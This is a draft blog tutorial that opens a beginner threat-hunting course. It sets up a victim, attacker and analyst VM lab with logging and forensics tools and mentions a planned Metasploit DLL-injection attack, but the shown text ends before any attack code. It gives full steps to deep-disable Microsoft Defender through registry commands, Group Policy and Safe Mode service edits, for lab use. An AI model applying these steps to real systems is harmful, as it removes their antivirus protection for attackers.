---
title: "Threat Hunting for Beginners: Hunting Standard Dll-Injected C2 Implants (Practical Course)"
date: 2023-07-12T02:01:58+05:30
description: "In this beginner-friendly practical course we'll learn how to threat hunt standard DLL-injected C2 implants. We'll set up our own virtual environment, perform the attack, perform our threat hunting analysis, as well as write a report on our findings."
tags: [threat_hunting, C2, dll_injection_attacks]
author: "faan|ross"
draft: false
---

*** 
# NOTE THIS IS CURRENTLY STILL WIP, THE REASON IT'S A PUBLIC DRAFT IS LONG AND CONVOLUTED SO JUST TRUST ME. ANYHOO - DO AS YOU WISH. 

***
# HELLO FRIEND, SO GLAD YOU COULD MAKE IT.

{{< figure src="/img/poe.gif" title="" class="custom-figure" >}}

`This is the first in an ongoing + always-evolving series on threat hunting.`

<!-- [NOTE: FOR THE VIDEO VERSION OF THIS COURSE CLICK HERE]() -->

The main thing I want you to know about this course is that ***we will learn by doing***. 

`(1)` We'll start off by creating + configuring our own virtual network, including systems for the victim, attacker, and analyst. 

`(2)` Then, instead of using prepackaged data we'll generate data by performing the attack ourselves. We'll use the *Metasploit* framework along with a *Powersploit* DLL-injection script to connect back from the victim to a *Meterpreter* handler. We'll then simulate a few rudimentary actions such as data exfiltration etc. 

`(3)` We'll then perform the actual threat hunt. We'll initially perform two rounds of live analysis - first using only Windows native tools to check the vitals, and then using *Process Hacker* we'll prod deeper into the memory. 

In the post-mortem analysis we'll look at the memory dump(*Volatility3*) and perform log analysis (*Sysmon* + *PowerShell ScriptBlock*) before wrapping things up with an abbreviated traffic analysis (*WireShark*). 

`(4)` Finally we'll crystallize all our insights in a report so we can effectively communicate our findings to the greater cybersecurity ecosystem. 

I will interject with theory when and where necessary, as well as provide references in each associated section. If something is unclear I encourage you to take a sojourn in the spirit of returning with an improved understanding of our topic at hand. This is after all a journey that need not be linear - the goal is to learn, and have as much fun as possible. `Act accordingly`. 

{{< figure src="/img/brentleave.gif" title="" class="custom-figure" >}}

Threat hunting is not typically viewed as an "entry-level" cybersecurity discipline, probably because it is a layer of abstraction woven from other, more *fundamental*, layers of abstraction. It is not a house built from bricks, but a neighbourhood built from houses. 

I have however created this course `specifically with the beginner in mind`. What that practically entails is that I do my best to not indulge in pedantry while providing sufficient foundational information so that you can follow along not only with what we are doing, but crucially, ***why we are doing it***.

{{< figure src="/img/karpathy.png" title="" class="custom-figure" >}}

I am a huge believer in this approach to learning outlined above by the wonderful [Andrej Karpathy](https://twitter.com/karpathy). This course is built on this approach - instead of mastering every single foundational discipline that converge as threat hunting, we will be learning on-demand. That's to say we'll start with the final application, and then work our way back to understand how it connects to its foundational knowledge. This way the fat is trimmed - we'll learn what we need, when we need, to understand why we're doing what we're doing. 

All this to say - `if you are beginner and you are curious about threat hunting then you are in the right place`. I can promise that if you venture along, by the end of our journey many so-called "advanced" topics will appear in a whole new light. Since one only truly begins a journey of understanding when going from the *idea phase* to the *experience phase*, we might as well start there.  

{{< figure src="/img/watermelon.gif" title="" class="custom-figure" >}}

Finally I do want to add that I myself am an `eternal student` and always learning. As this course (hopefully) may play some role in your journey of understanding, so of course it has played such a role in my own. As such it's *highly* likely I will make mistakes. 

Mistakes themselves of course represent the potential for further understanding - but only if we become aware of them. So if there's anything here you are unsure about, or simply flat-out disagree with ***please*** feel free to reach out and share this with me so that everyone can potentially benefit. You can connect with me on [Twitter](https://twitter.com/faanross), or feel free to [email me](mailto:moi@faanross.com).

{{< figure src="/img/falcor.gif" title="" class="custom-figure" >}}

***

# COURSE OUTLINE

`Here's a quick overview of the entire course:` 
| # | ***Topic*** |
|----------|----------|
| 1 | `Setting Up Your Virtual Environment` | 
| 1.1 | Introduction |
| 1.2 | Requirements |
| 1.3 | Hosted Hypervisor |
| 1.4 | VM Images |


***

# 1. SETTING UP OUR VIRTUAL ENVIRONMENT

{{< figure src="/img/randy01.gif" title="" class="custom-figure" >}}

# 1.1 INTRODUCTION

In this section we'll set up the three VMs we'll need for the course - Windows 10 (Victim), Kali Linux (Attacker), and Ubuntu 20.04 (Post-Mortem Analysis). First we'll download the iso images and use them to install the operating systems. Then, depending on the specific VM, we'll perform some configurations as well as install extra software.

{{< figure src="/img/tripleram.gif" title="" class="custom-figure" >}}

# 1.2 REQUIREMENTS

I do want to give you some sense of the hardware requirements for this course, however I also have to add that I am not an expert in this area. ***AT ALL.*** So I'll provide an overview of what we'll be running, as well as what I think this translates to in terms of host resources (ie your actual system). But please - if you disagree with my estimation and believe you can get the same results by adapting the process, then please do so. After all - this is the *way of the hacker*. 

{{< figure src="/img/thehacker.gif" title="" class="custom-figure" >}}

As mentioned above, we'll create 3 VMs in total, however, at any one moment there will only be a `maximum of 2 VMs running concurrently`. For each of these VMs I recommend the following system resources:
- min 2 (ideally 4) CPU cores
- min 4 (ideally 8) GB RAM
- around 60 GB HD space (allocated)

So based on this, that is roughly 2x the above + resources for your actual host system, you would likely need something along the lines of:
- 8 CPU cores (12+ even better)
- 16 GB RAM (32+ even better)
- 200 GB free HD space

{{< figure src="/img/beefcake.gif" title="" class="custom-figure" >}}

Now I understand this requirement is rather beefy, but consider:
- You don't have to use a single system to run the entire VLAN - you could create an actual physical network, for ex with a Raspberry Pi cluster, and run the VMs on that. Or mini-pcs, or refurbished clients - really for a few hundred dollars you could more than easily be equipped to run a small network. I don't want to sound insensitive to a few 100 dollars, but I'm gonna level with you: `if you want to learn cybersecurity then there is no better investment than having localized resources to create virtual simulations`. 
- In case you don't want to invest up-front but don't mind paying some running costs: You can also use a service like [Linode](https://www.linode.com) and simply rent compute via the cloud. You can then install your VMs on that, and have access to them for as long as you care to foot the bill.

Finally I want to mention that beyond the hardware, `everything we will use is completely free`. This course ain't upselling a full course, and every piece of software is freely available. The sole exception has free alternatives, which I'm about to discuss with you right now. 

# 1.3 HOSTED HYPERVISOR
So in the off-chance you don't know: a hosted (type 2) hypervisor is the software that allows us to run virtual machines on top of our base operating system. It's kinda like *Inception* - it allows us to create systems within our systems. 

{{< figure src="/img/inception.gif" title="" class="custom-figure" >}}

For this course I'll be using [VMWare Workstation](https://store-us.vmware.com/workstation_buy_dual), which as of writing costs around $200. However you could also do it with either [VMWare Player](https://www.vmware.com/ca/products/workstation-player.html), or [Oracle Virtualbox](https://www.virtualbox.org/wiki/Downloads), both of which are free. 

I've used both `VMWare Player` and `VirtualBox` in the past, they mostly work well but running into some issues from time-to-time should not be completely unexpected. That being said, the problems I encountered were all, in hindsight, opportunities to learn. Frustrating - *feck yesh*. Enriching - sure. 

Since I switched over to `VMWare Workstation` my experience has been significantly more stable, so if you do have the money and are committed to this path as a career I would definitely consider getting it. That being said I don't wanna come across as some corporate shill, so really the choice is totally up to you.

{{< figure src="/img/makechoice.gif" title="" class="custom-figure" >}}

Note that if you decide to not use `VMWare Workstation` then some of the details of the setup might be different. When that occurs it'll be up to you to figure out how to adapt it for your situation - Google, ChatGPT, StackExchange, common sense etc. Again, use the opportunities when things don't happen exactly "as they should" to learn. As a wise emperor once said - ***The impediment to action advances action. What stands in the way becomes the way.*** 

`So at this point please take a moment to download and install the hypervisor of your choice.`

Once that's done with feel free to proceed...

{{< figure src="/img/pleasego.gif" title="" class="custom-figure" >}}

# 1.4 VM IMAGES

Now that you have your hypervisor up and running the next thing we need to do is install our actual virtual machines. There are a few ways to do this, you can for example simply download the entire VM and simply import it into your hypervisor. This does usually mean that the file you'll be downloading will be quite large, so we'll opt for another approach - using iso files. You can think of an iso file simply as a "virtual copy" of the installation disc. So instead of importing the completed VM, we will be installing the VM ourselves using the iso image. 

So please go ahead and download the following 3 iso's:
* For the victim we'll use [Windows 10 Enterprise Evaluation 32-bit](https://info.microsoft.com/ww-landing-windows-10-enterprise.html). Note that MS will want you to register (it's free), so do so to download the iso OR [click here](https://techcommunity.microsoft.com/t5/windows-11/accessing-trials-and-kits-for-windows/m-p/3361125) to go to a Microsoft Tech Community post with direct download links. 
* For the attacker we'll use [Kali Linux](https://www.kali.org/get-kali/#kali-installer-images).
* For post-mortem analysis we'll be using [Ubuntu Linux Focal Fossa](https://releases.ubuntu.com/focal/). The reason being is in future courses we'll be using *RITA*, which, as of writing, runs best on *Focal Fossa*. 

Once you've successfully downloaded all three iso images we are ready to proceed. 

# 1.5 VM 1: WINDOWS 10 AKA "THE VICTIM" 

{{< figure src="/img/screamdrew.gif" title="" class="custom-figure" >}}
 
# 1.5.1 INSTALLATION

1. In VMWare Workstation goto `File` -> New Virtual Machine. 
2. Choose `Typical (recommended)`, then click `Next`. 
3. Then select `I will install the operating system later` and hit `Next`.

{{< figure src="/img/image001.png" title="" class="custom-figure" >}}

4. Select `Microsoft Windows`, and under Version select `Windows 10`. 
5. Here you are free to call the machine whatever you'd like, in my case I am calling it `Victim`. 
6. Select 60 GB and `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.

{{< figure src="/img/image002.png" title="" class="custom-figure" >}}

8. Under `Memory` (see left hand column) I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Windows 10 iso file. 
11. Once done click `OK` on the bottom to exit out of the Hardware options dialog box. 

You should now see your VM in your Library (left hand column), select it and then click on `Power on this virtual machine`. If you don't see a Library column on the left simply hit `F9` which toggles its visibility.

Wait a short while and then you should see a Windows Setup window. Choose your desired language et cetera, select `Next` and then click on `Install Now`. Select `I accept the license terms` and click `Next`. Next select `Custom: Install Windows only (advanced)`, and then select your virtual HD and click Next.

Once its done installing we’ll get to the setup, select your region, preferred keyboard layout etc. Accept the `License Agreement` (if you dare - ***mwhahaha!***). Now once you reach the `Sign in` page don’t fill anything in, rather select `Domain join instead` in the bottom left-hand corner.

{{< figure src="/img/image006a.png" title="" class="custom-figure" >}}

Choose any username and password, in my case it'll be the highly original choice of `User` and `password`. Then choose 3 security questions, since this is a "burner" system used for the express purpose of this course don't overthink it - randomly hitting the keyboard a few times will do just fine. Turn off all the privacy settings, and for `Cortana` select `Not Now`.

Windows will now finalize installation + configuration, this could take a few minutes, whereafter you will see your desktop.

# 1.5.2 VMWARE TOOLS
Next we'll install VMWare Tools which for our purposes does two things. First, it ensure that our VMs screen resolution assumes that of our actual monitor, but more importantly it also gives us the ability to copy and paste between the host and the VM. 

So just to be sure, at this point you should be staring at a Windows desktop. Now in the VMWare menu bar click `VM` and then `Install VMWare Tools`. If you open `Explorer` (in the VM) you should now see a `D:` drive. 

{{< figure src="/img/image008.png" title="" class="custom-figure" >}}

Double-click the drive, hit `Yes` when asked if we want this app to make changes to the device. Hit `Next`, select `Typical` and hit `Next`. Finally hit `Install` and then once done `Finish`. You'll need to restart your system for the changes to take effect, but we'll shut it down since we need to change a setting. So hit the Windows icon, Power icon, and then select `Shut Down`.

Right-click on your VM and select `Settings`. In the list on the LHS select `Display`, which should be right at the bottom. On the bottom - deselect `Automatically adjust user interface size in the virtual machine`, as well as `Strech mode`, it should now look like this:

{{< figure src="/img/image009.png" title="" class="custom-figure" >}}

Go ahead and start-up the VM once again, we'll now get to configuring our VM.

# 1.5.3 Deep disable MS Defender

I call this 'deep disable' because simply toggling off the switches in `Settings` won't actually fully disable Defender and Updates. You see, Windows thinks of you as a younger sibling - it feels the need to protect you a bit, most of the time without you even knowing. (Unlike Linux of course which will allow you to basically nuke your entire OS if you so desired.) 

{{< figure src="/img/winlin.png" title="" class="custom-figure" >}}

And just so you know why it is we're doing this:
- We are disabling Defender so that the AV won't interfere with us attacking the system. Now you might think well this represents an unrealistic situation since in real-life we'll always have our AV running. Thing is, this is a simulation - we are simulating an actual attack. Yes the AV might pick up on our mischievous escapades here since we are using very well-known and widely-used malware (Metasploit mainly). But, if you are being attacked by an actual threat actor worth their salt they likely won't be using something so familiar as default Metasploit modules - they will likely be capable of using analogous but obfuscated technologies that your AV will not pick up on.
- As for updates, we disable this because sometimes we can spend all this time configuring and setting things up and then one day we boot our VM up, Windows does it's whole automatic update schpiel, and suddenly things are broken. This is thus simply to support the stability of our long-term use of this VM. 

1. **Disable Tamper Protection**
    1. Hit the `Start` icon, then select the `Settings` icon.
    2. Select **`Update & Security `**.
    3. In LHS column, select `Windows Security`, then click `Open Windows Security`.
    4. A new window will pop up. Click on `Virus & threat protection`.
    5. Scroll down to the heading that says `Virus & threat protection settings` and click on `Manage settings`.
    6. There should be 4 toggles in total, we are really interested in disabling `Real-time protection`, however since we are here just go ahead and disable all of them. 
    7. Note that Windows will warn you and ask if you want to allow this app to make changes to the device, hit `Yes`.
    8. All 4 toggle settings should now be disabled.

{{< figure src="/img/image010.png" title="" class="custom-figure" >}}
    
2. **Disable the Windows Update service**
    1. Open the Run dialog box by pressing Win+R.
    2. Type **`services.msc`** and press Enter.
    3. In the Services list, find **`Windows Update`**, and double-click it.
    4. In the Windows Update Properties (Local Computer) window, under the **`General`** tab, in the **`Startup type:`** dropdown menu, select **`Disabled`** - see image below.
    5. Click **`Apply`** and then **`OK`**.
    
 {{< figure src="/img/image011.png" title="" class="custom-figure" >}}

3. **Disable Defender via Group Policy Editor**
    1. Open the Run dialog box by pressing Win+R.
    2. Type `gpedit.msc` and hit enter. The `Local Group Policy Editor` should have popped up.
    3. In the tree on the LHS navigate to the following: `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Microsoft Defender Antivirus`.
    4. In the RHS double-click on `Turn off Microsoft Defender Antivirus`.
    5. In the new window on the top left select `Enabled` - see image below. 
    6. First hit `Apply` then `OK`.

 {{< figure src="/img/image012.png" title="" class="custom-figure" >}}

4. **Disable Updates via Group Policy Editor**
    1. Still in `Local Group Policy Editor`, navigate to: `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Windows Update`.
    2. In the RHS double-click on `Configure Automatic Updates`.
    3. Select `Disabled`, then click `Apply` and `OK`.

{{< figure src="/img/image013.png" title="" class="custom-figure" >}}

5. **Disable Defender via Registry**
    1. In the search bar on the bottom type `cmd`.
    2. On the top left, right under `Best match` you should see `Command Prompt`.
    3. Right-click and select `Run as administrator`, hit `Yes`.
    4. Copy and paste the following command below into your command prompt and hit enter.
    ```
    REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    ```
    
Almost there! We just need to boot into Safe Mode to make some final adjustments to the registry and then we are good to go.

6. **Reboot system in Safe Mode**
    1. Open the Run dialog box by pressing Win+R.
    2. Write `msconfig` and hit enter.
    3. Select the `Boot` tab.
    4. Under `Boot options` select `Safe boot`, ensure `Minimal` is selected - see image below. 
    5. Hit `Apply` first, the `OK`.
    6. Select `Restart`.
    
{{< figure src="/img/image014.png" title="" class="custom-figure" >}}

7. **Disable Defender via Registry**
    1. Open the Run dialog box by pressing Win+R.
    2. Write `regedit` and hit enter, this should bring up the `Registry Editor`.
    3. Below you will see a list of 6 keys. For each of these keys you will follow the same process: once the key is selected find the `Start` value in the RHS, double-click, change the value to `4` and hit `OK` - see image below.
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `Sense`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdBoot`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WinDefend`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdNisDrv`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdNisSvc`
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SYSTEM` > `CurrentControlSet` > `Services` > `WdFilter`

{{< figure src="/img/image015.png" title="" class="custom-figure" >}}

8. **Disable Updates via Registry**
    1. Still in `Registry Editor` let's navigate to the following:
    - `Computer` > `HKEY_LOCAL_MACHINE` > `SOFTWARE` > `Microsoft` > `Windows` > `CurrentVersion` > `WindowsUpdate` > `Auto Update`
    2. Right-click the `Auto Update` key, select `New`, and then click `DWORD (32-bit) Value`.
    3. Name the new key **`AUOptions`** and press Enter.
    4. Double-click the new **`AUOptions`** key and change its value to **`2`**. Click **`OK`** - see image below.
    5. Close Registry Editor.

{{< figure src="/img/image016.png" title="" class="custom-figure" >}}

9. **Leave Safe Mode**
    1. All that's left to do is get back into our regular Windows environment.
    2. Open the Run dialog box by pressing Win+R.
    3. Write `msconfig` and hit enter.
    4. Select `Boot` tab.
    5. Deselect `Safe boot`, hit `Apply`, hit `OK`.
    6. Hit `Restart`.

And that, I can promise you, is by far the most boring part of this entire course. But I did it on purpose - this is very important if you are going to start simulating attacks and threat hunting on your own system. And the cool thing is now that we've done it we'll also learn how to create templates + clones in bit, meaning hence forth when you want a victim Windows 10 VM you can simply clone this one with a few clicks instead of going through that entire process again. But before that, let's setup all the awesome tools we'll be using in this course. 

# Sysmon 

You should now be back in the normal Windows environment looking at your Desktop. Let' set up `Sysmon` - a simple, free, Microsoft-owned program that will DRAMATICALLY improve our logging ability. 



Before we get installing Sysmon there's just one thing you need to know - in addition to downloading the actual Sysmon file we also need a config file. One day when you get to *that* level you can even create your own config file, which will allow you to make it behave exactly how you want it to. But for now, since we are decidedly not yet there, let's download and use one made by some really smart people. Of late  I have heard a few trusted sources, included [Eric Conrad](https://www.ericconrad.com) prefer [this version from Neo23x0](https://github.com/bakedmuffinman/Neo23x0-sysmon-config) whose authors included another blue team giant, [Florian Roth](https://twitter.com/cyb3rops?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor). 

So first download the config file (which is in xml format) from the link above, then [go here to download Sysmon](https://download.sysinternals.com/files/Sysmon.zip). You should now have two zip files - the config you downloaded from Github, as well as the Sysmon zip file. Extract the Sysmon file, the contents should look as follows:

{{< figure src="/img/image017.png" title="" class="custom-figure" >}}

Now also extract the zip file containing the config. Inside of the folder rename `sysmonconfig-export.xml` to `sysmonconfig.xml`. Now simply cut (or copy) the file and paste it in the folder containing `Sysmon`. 

Great, everything is set up so now we can install it with a simple command. Open command prompt as administrator and navigate to the folder containing `Sysmon` and the config file - in my case it is `c:\Users\User\Downloads\Sysmon`. Run the following command:

```
Sysmon.exe -accepteula -i
```

This is what a successful installation will look like

{{< figure src="/img/image018.png" title="" class="custom-figure" >}}

Now let's just validate that it's running. First type `powershell` so we change over into a PS shell, then run the command `Get-Service sysmon`. In the image below we can see it is running - we are good to go!

{{< figure src="/img/image019.png" title="" class="custom-figure" >}}

That's it for Sysmon, now let's enable PowerShell logging. 

# PowerShell Logging

For security purposes, another quick and easy proverbial switch we can flip is enabling PowerShell logging. This is great because one specific type of PowerShell logs (`ScriptBlock`) will record exactly what command was run in PowerShell. As we know, in-line with the `Living off the Land` paradigm, modern adversaries LOVE abusing PowerShell; and so the ability to see  exactly what commands were run is obviously a huge boon. 

Something to be aware of is that there are a few types of PowerShell logging: Module, ScriptBlock, Operational, Transcription, Core, and Protected Event. For the purposes of this course we will only be activating `ScriptBlock`, as well as `Operational`. While activating the former tells PowerShell to log the commands, we also need to activate `Operational` so that the system is able to properly save the logs. 

NOTE: This entire process could be performed in the GUI using `Group Policy Editor`, we will however be performing it via PowerShell command line. You should **always** prefer this method to using the GUI. Not simply to look cool, nay, there is a very good practical reason for this.

Imagine for a moment you needed to activate this feature on 1000 stations. You could either do so by logging into each station individually and interacting with the `gpedit` GUI interface, which would likely take you a few days working at a ferocious pace like an automaton for 1000 stations. Alternatively, you could run a single command from a domain controller, which would take less than a minute for 1000 stations. 

This is an admittedly dramatic way of saying that performing administrative tasks using PowerShell commands scales well, while flipping GUI toggles does not scale at all. So invest your time early on learning the methods that don't break down the moment you need to do it at scale, it's so worth it. 

{{< figure src="/img/worth.gif" title="" class="custom-figure" >}}

So open up PowerShell as an administrator and run the following commands.
1. First we'll set the execution policy to allow us to make the changes:
```
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
```
2. We'll now create a new registry path for `ScriptBlockLogging`:
```
New-Item -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Force
```
3. Now create a new DWORD property EnableScriptBlockLogging and set its value to 1:
```
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord -Force
```
4. And finally we'll enable Operational logging to ensure our ScriptBlock logs are saved properly:
```
wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:true
```

# Install Software

And now finally we'll install four programs:
- We'll use **Process Hacker** for live memory forensics 
- We'll use **winpmem** to create a memory dump for post-mortem memory forensics 
- We'll use **Wireshark** to generate a pcap for egress analysis

You can download [Process Hacker here](https://processhacker.sourceforge.io/downloads.php). Once downloaded go ahead and install.

You can download the latest release of [winpmem here](https://github.com/Velocidex/WinPmem/releases). Since its a portable executable there is no installation required, just download the `.exe` file and place it on the desktop. 

And finally the `WireShark` setup file can be [downloaded from here](https://2.na.dl.wireshark.org/win32/Wireshark-win32-3.6.15.exe). Once downloaded run Setup, just keep all options per default, nothing fancy required. 

That's it friend. We are done with BY FAR the heaviest lifting in terms of VM setup - the next two will be a breeze. But before we get to that there's one very simple thing we can do that will make our lives much easier in the future - turning this VM into a template for cloning.

# Creating a Template 

{{< figure src="/img/mememe.gif" title="" class="custom-figure" >}}

So why do we want to do this? Well by turning this VM we just created into a template we are in essence creating an archetype (blueprint). Then, whenever we want this same "victim" system for any project or course we can simply clone it. Thus instead of repeating this entire, rather cumbersome process we can click a few buttons and have it ready to go in under a minute. This is also useful if we ever "mess up" the VM, we can just come back to this starting point where the machine is fresh, but all our configurations and software are as required. 

1. First shut down the VM.
2. In VMWare you should see the library pane on the LHS listing our VM. If you don't, hit `F9`, or go to `View` > `Customize` > `Library`.
3. Right-click on our VM (`Victim`), select `Snapshot` > `Take Snapshot`.
4. Name it anything you'd like, I will be calling it `Genesis`. Hit `Take Snapshot`.
5. Again right-click the VM and select `Settings`. 
6. On the top left we can see two tabs - `Hardware` and `Options`, select `Options`.
7. Go down to the bottom and select `Advanced`.
8. Select `Enable Template mode (to be used for cloning)`, hit `OK`.

{{< figure src="/img/image021.png" title="" class="custom-figure" >}}

9. Note you might want to rename this VM to something like `Victim Template`, so we are aware this is the template that we should not be using, but rather use for cloning. You can do this under `Settings` > `Options` > `General`.

{{< figure src="/img/image022.png" title="" class="custom-figure" >}}

10. Now let's create our first clone which we will actually be using in the course. Right-click on `Victim Template`, select `Manage` > `Clone`. Hit `Next`.
11. We'll select the snapshot we created and hit `Next`. 
12. Keep selection as `Create a linked clone` and hit `Next`. 
13. Give your clone a name, I will be calling it `Victim01`. Choose a location and hit `Next`.

That's it! You should now see both `Victim Template` and `Victim01` in your library.

The bad news - we still have two VMs to install. The good news - they will require minimal-to-no configuration, so at this point we're about 80% done with our VM setup. So let's get it done.

# VM 2: Kali Linux aka "The Attacker" 
{{< figure src="/img/attacker.gif" title="" class="custom-figure" >}}

We'll be using Kali Linux to simulate the adversary. The great thing about Kali Linux is that everything we'll need comes pre-packaged, so we just have to install the actual operating system. 

1. In VMWare hit `File` > `New Virtual Machine...`
2. `Typical (recommended)` and hit `Next`. 
3. `I will install the operating system later` and hit `Next`.
4. Select `Linux`, and under Version select `Debian 11.x 64-bit`. (Note: Kali Linux is built on top of Debian Linux).

{{< figure src="/img/image023.png" title="" class="custom-figure" >}}

5. Again call the machine whatever you'd like, in my case I am calling it `Hacker`. 
6. Increase the Maximum disk size to 60 GB and select `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.
8. Under `Memory` I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Kali Linux iso image.
11. And again for `Network Adapter` we'll keep it as either `NAT` or `Bridged` for now. Click `Close` then `Finish`.

So now let's get to actually installing it:
1. Right-click on the VM and select `Power` > `Start Up Guest`.
2. Select `Graphical Install`.
3. Select language, country etc.
4. Choose any `Hostname`, leave `Domain name` blank, for Full name and username I chose `hacker`.
5. Create a password, again though OBVIOUSLY not a suggested real-world practice, in these simulations I tend to simply use `password` since it minimizes any administrative friction. 
6. Choose a timezone.
7. Next select `Guided - use entire disk` and hit `Continue`.
8. The only disk should be selected, hit `Continue`.
9. Keep `All files in one partition (recommended for new users)`, hit `Continue`.
10. Keep `Finish partitioning and write changes to disk`, hit `Continue`.
11. Select `Yes` and `Continue`.
12. In `Software selection` keep the default selection and hit `Continue`. Kali will now start installing, just be aware this can take a few minutes, probably around 5 to 10. 

{{< figure src="/img/image024.png" title="" class="custom-figure" >}}

13. Next it'll ask you about installing a GRUB boot loader, keep it selected as `Yes` and hit `Continue`. 
14. Select `/dev/sda` and hit `Continue`. More installing... 

{{< figure src="/img/image025.png" title="" class="custom-figure" >}}

15. Finally it will inform us it's complete, we can hit `Continue` causing the system to reboot into Kali Linux. Enter your username and password and hit `Log In`.
16. Let's shut down the VM, then right-click on it in the library and select `Settings`. Under `Display` deselect `Stretch mode` and hit `OK`.

{{< figure src="/img/image026.png" title="" class="custom-figure" >}}

And that's it for our attacker machine - feel free to repeat the Template-Cloning process we performed for our Windows 10 VM if you so desire.

# VM 3: Ubuntu Linux 20.04 aka "The Analyst" 
{{< figure src="/img/analysis.gif" title="" class="custom-figure" >}}

And now finally we'll set up our Ubuntu VM, afterwards we'll install RITA (incl Zeek), and Volatility. 

1. In VMWare hit `File` > `New Virtual Machine...`
2. `Typical (recommended)` and hit `Next`. 
3. `I will install the operating system later` and hit `Next`.
4. Select `Linux`, and under Version select `Ubuntu 64-bit`.
5. Again call the machine whatever you'd like, in my case I am calling it `Analyst`. 
6. Increase the Maximum disk size to 60 GB and select `Split virtual disk into multiple files`. 
7. Then on the final screen click on `Customize Hardware`.
8. Under `Memory` I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB. 
- NOTE: Keep in mind that you will never run more than 2 VMs at the same time (Victim + Hacker), this VM will always only run by itself after the simulated attack. 
9. Under `Processors` I suggest at least 2, if possible given your available resources then increase it to 4.
10. Under `New CD/DVD (SATA)` change Connection from Use Physical Drive to `Use ISO image file`. Click `Browse…` and select the location of your Ubuntu Linux 20.04 iso image. Make sure `Connect at power on` is enabled.
11. And again for `Network Adapter` we'll keep it as either `NAT` or `Bridged` for now. Click `Close` then `Finish`.

So now let's get to actually installing it:
1. Right-click on the VM and select `Power` > `Start Up Guest`.
2. Select `Try or Install Ubuntu`.
3. Once it boots up the GUI, select `Install Ubuntu`.

{{< figure src="/img/image027.png" title="" class="custom-figure" >}}

4. Select your keyboard and language, hit `Continue`.
5. Keep `Normal Installation` selected, unselect `Download updates while installing Ubuntu`.

{{< figure src="/img/image028.png" title="" class="custom-figure" >}}

6. Keep `Erase disk and install Ubuntu` selected, then hit `Install Now`. 
7. For the popup asking if you want to `Write the changes to disks?`, hit `Continue`.
8. Choose a timezone and hit `Continue`.
9. Now fill in your name and desired credentials, I'll be using `analyst` and `password`.
10. When it's complete you can power the system off. Go into settings, under `CD/DVD (SATA)` disable `Connect at power on`.
11. Then goto `Display`, disable `Stretch mode`.
12. Hit `OK`, start the VM up once again, log in.

`NOTE: A few moments after logging in and answer Ubuntu's questions you'll be asked whether you want to upgrade. IMPORTANT: Do not do so, decline the offer.`

{{< figure src="/img/image029.png" title="" class="custom-figure" >}}

OK, that's it and now finally we'll install RITA, Zeek, and Volatility.

# RITA + Zeek

Here's the cool thing about RITA: it will automatically install Zeek (and MariaDB btw) when you install it. Even better, it actually makes alterations to the standard Zeek config which will serve us even better - I'll discuss the exact details of this and why it's important when we get to that section in our course. For now let's get to installing.

1. Goto the [RITA Github repo](https://github.com/activecm/rita).
2. Scroll down to `Install` and follow the instructions using the `install.sh` script. During installation you will be asked a few questions, answer `y` and hit enter each time. 
3. Let's check the version of RITA to ensure installation was successful. First close your terminal and reopen and then run the commands seen in image below, you should get similar results. 

{{< figure src="/img/image030.png" title="" class="custom-figure" >}}

# Volatility

Similarly to RITA we'll install Volatility by downloading/cloning the repo.
1. Either download the zip file from the repo [here](https://github.com/volatilityfoundation/volatility3), or run the command below from terminal to clone the repo
```
git clone https://github.com/volatilityfoundation/volatility3.git
```
2. Next we'll need to install `pip`, which is a package manager for Python (Volatility is written in Python). We'll do this so we can install all the required package dependencies. Run the following commands:
```
sudo apt update
sudo apt install python3-pip
```
3. Once that's complete we can install our package dependencies. Open a terminal and navigate to where you installed/cloned Volatility. Now simply run the following command:
```
pip3 install -r requirements.txt
```
4. We're done, feel free to shut down your Ubuntu VM as we won't be using it for some time. 

OK. Do you know what time it is? Yeah it's time for all this installing and configuring to pay off - and we kick things off by emulating the attacker! Let's get it!

{{< figure src="/img/strangelove.gif" title="" class="custom-figure" >}}

***

# 2. Performing the Attack 
# Introduction 
Why are we performing the attack ourselves? Why didn't I just do it, export all the requisite artifacts, and share this with you? Why did I make you go through this rigmorale - is it simply that I am cruel?

{{< figure src="/img/cruel.gif" title="" class="custom-figure" >}}

Nah. The reason is pretty simple - I have a deep sense of conviction in the idea that you can only truly "get" defense if you equally "get" offense. If I just black box that entire process then once we start hunting everything is abstract - the commands we ran, the files we used, the techniques we employed etc are all just ideas. So when you then learn to threat hunt these things that exists as nothing more than ideas for you, then you'll most be memorizing - if X happens then I do Y.

But, if instead you do the attack first and learn everything involved by doing it yourself, it does not exist as an abstract idea but as a concrete experience. I think then when you perform the threat hunt, because you have a connection to these things you are hunting (since you created them), well then you learn less through memorization and more through understanding. At least this has been my experience as well as that of many, *much* smarter people than myself. 

